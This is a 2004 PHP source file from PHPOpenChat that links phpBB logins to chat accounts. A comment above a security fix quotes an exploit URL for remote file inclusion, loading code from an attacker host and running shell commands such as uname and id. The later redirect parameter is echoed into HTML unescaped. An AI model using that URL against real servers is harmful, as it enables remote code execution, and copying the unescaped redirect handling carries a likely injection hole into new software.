<?php //-*-php-*-
/*   ********************************************************************   **
**   Copyright notice                                                       **
**                                                                          **
**   (c) 1995-2004 PHPOpenChat Development Team                             **
**   http://phpopenchat.sourceforge.net/                                    **
**                                                                          **
**   All rights reserved                                                    **
**                                                                          **
**   This script is part of the PHPOpenChat project. The PHPOpenChat        **
**   project is free software; you can redistribute it and/or modify        **
**   it under the terms of the GNU General Public License as published by   **
**   the Free Software Foundation; either version 2 of the License, or      **
**   (at your option) any later version.                                    **
**                                                                          **
**   The GNU General Public License can be found at                         **
**   http://www.gnu.org/copyleft/gpl.html.                                  **
**   A copy is found in the textfile GPL and important notices to the       **
**   license from the team is found in the textfile LICENSE distributed     **
**   with these scripts.                                                    **
**                                                                          **
**   This script is distributed in the hope that it will be useful,         **
**   but WITHOUT ANY WARRANTY; without even the implied warranty of         **
**   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          **
**   GNU General Public License for more details.                           **
**                                                                          **
**   This copyright notice MUST APPEAR in all copies of the script!         **
**   ********************************************************************   */

/*
  $Author: letreo $
  $Date: 2004/02/24 17:05:18 $
  $Source: /cvsroot/phpopenchat/chat3/contrib/phpbb/Attic/poc.php,v $
  $Revision: 1.1.2.3 $
*/
//quick security fix
//'cause, if register_globals=on and allow_url_fopen=on
//the following is possible:
//http://www.victime.al/phpopenchat/contrib/phpbb/poc.php?phpbb_root_path=http://www.haxorz.al/asc?&cmd=uname%20-a;w;id;pwd;ps
//thx to the Albania Security Clan (Mafia_Boy) 
//for finding the bug and bringing us to the light!
if( !function_exists('version_compare') || version_compare(PHP_VERSION, "4.1.0", "<") )
  die('please update your php installation');

$givenParams = array_keys($_REQUEST);
foreach($givenParams as $param )
  unset(${$param});

/*
To integrate PHPOpenChat (POC) into your phpbb-installation, copy this file 
to the install dir of phpbb and setup $poc_doc_root and $poc_root_path below
*/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.'.$phpEx);

$userdata = session_pagestart($user_ip, PAGE_PROFILE);
init_userprefs($userdata);

//PHPOpenChat properties
/*
supposition is, you have installed phpbb and PHPOpenChat within the document root
of your webserver side by side.

<http://your.host.tld>
 |
 +</phpbb>
 |
 +</phpopenchat>

*/
$poc_doc_root  = '/phpopenchat';
$poc_root_path = './../phpopenchat';

// session id check
if (!empty($HTTP_POST_VARS['sid']) || !empty($HTTP_GET_VARS['sid'])) {
	$sid = (!empty($HTTP_POST_VARS['sid'])) ? $HTTP_POST_VARS['sid'] : $HTTP_GET_VARS['sid'];
} else {
	$sid = '';
}

$script_name = preg_replace('/^\/?(.*?)\/?$/', '\1', trim($board_config['script_path']));
$script_name = ( $script_name != '' ) ? $script_name . '/poc.'.$phpEx : 'poc.'.$phpEx;
$server_name = trim($board_config['server_name']);
$server_protocol = ( $board_config['cookie_secure'] ) ? 'https://' : 'http://';
$server_port = ( $board_config['server_port'] <> 80 ) ? ':' . trim($board_config['server_port']) . '/' : '/';

$server_url = $server_protocol . $server_name . $server_port . $script_name;
if( $userdata['session_logged_in'] == 1 && $userdata['user_active'] == 1 ) {
  require_once($poc_root_path.'/config.inc.php');
  require_once(POC_INCLUDE_PATH.'/class.Chatter.inc');
  require_once(POC_INCLUDE_PATH.'/adodb/adodb.inc.php');

  $chatter = &new POC_Chatter();
  $chatter->set_nick($userdata['username']);

  $current_chatter = $chatter;//save current

  $chatter->set_user($userdata['username']);
  $chatter->set_email($userdata['user_email']); //is hidden by default
  //$chatter->set_name($userdata['']);
  $chatter->set_homePageURL($userdata['user_website']);
  $chatter->set_icqNumber($userdata['user_icq']);
  $chatter->set_motto($userdata['user_sig']);
  $chatter->set_aimNickname($userdata['user_aim']);
  $chatter->set_yimNickname($userdata['user_yim']);
  $chatter->set_interests($userdata['user_interests']);
  $chatter->set_theme( 'openchat' );//use default theme of PHPOpenChat
  
  if( $userdata['user_level'] == ADMIN ){
    $chatter->add_to_group('operator');
  }

	if ( !empty($userdata['user_lang']) ){
		$lang = $userdata['user_lang'];
	}else{
	  $lang = $board_config['default_lang'];
	}
	$chatter->set_preferred_language($lang);
  unset($lang);
	
  //do not send registration mails
  $chatter->set_skip_email();
  
  if( $current_chatter != $chatter ){
    if( !$chatter->is_registered()) {
      $chatter->register();
    } else {
      $chatter->update();
    }
  }
  unset($current_chatter);

  $chatter->mkinstance_persist();
  unset($chatter);
  
  header('Status: 301');
  header('Location: http://'.$server_name.$poc_doc_root.'/index.php?use_db_instance='.$userdata['username']);
  exit;
}else{
  $redirect = ( !empty($HTTP_POST_VARS['redirect']) ) ? $HTTP_POST_VARS['redirect'] : "";
  $redirect = str_replace("?", "&", $redirect);

  $template->assign_vars(array(
    'META' => "<meta http-equiv=\"refresh\" content=\"3;url=login.$phpEx?redirect=$redirect\">")
  );

  $message = $lang['Error_login'] . '<br /><br />' . sprintf($lang['Click_return_login'], "<a href=\"login.$phpEx?redirect=$redirect\">", '</a>') . '<br /><br />' .  sprintf($lang['Click_return_index'], '<a href="' . append_sid("index.$phpEx") . '">', '</a>');
  message_die(GENERAL_MESSAGE, $message);
}

//redirect(append_sid("index.$phpEx", true));
?>